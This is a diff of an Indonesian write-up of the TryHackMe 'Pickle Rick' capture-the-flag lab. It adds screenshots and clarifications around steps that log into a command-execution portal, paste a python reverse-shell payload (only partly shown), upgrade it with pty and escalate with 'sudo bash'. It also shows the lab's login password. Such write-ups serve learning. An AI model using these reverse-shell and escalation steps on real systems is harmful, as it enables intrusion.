@@ -73,6 +73,9 @@ password: Wubbalubbadubdub
 - Lakukan login ke halaman `http://<IP_machine>/login.php` dengan username dan password yang ditemukan diatas
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%206.JPG)
+
+- Setelah login berhasil, halaman langsung di redirect ke halaman portal.php
+
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%207.JPG)
 
 - Jika kita ketik `ls` lalu tekan Execute maka diperoleh daftar file sebagai berikut
@@ -92,7 +95,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2010.JPG)
 
-- Copy payload dan paste ke halaman `http://<IP_machine>/portal.php` lalu tekan Execute
+- Copy payload dan paste ke halaman portal.php `http://<IP_machine>/portal.php` lalu tekan Execute
 
 ![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2011.JPG)
 
@@ -116,7 +119,11 @@ python3 -c 'import pty;pty.spawn("/bin/bash")'
 sudo bash
 ```
 
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2015.JPG)
+
 - Setelah berhasil masuk ke user root, navigasi ke directory **/root** maka disini ditemukan file **3rd.txt** yang berisi final ingredient. Buka file tersebut dengan perintah `cat 3rd.txt`
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Pickle%20Rick/assets/pr%2016.JPG)
 
 ## Pertanyaan dan Jawaban:
 
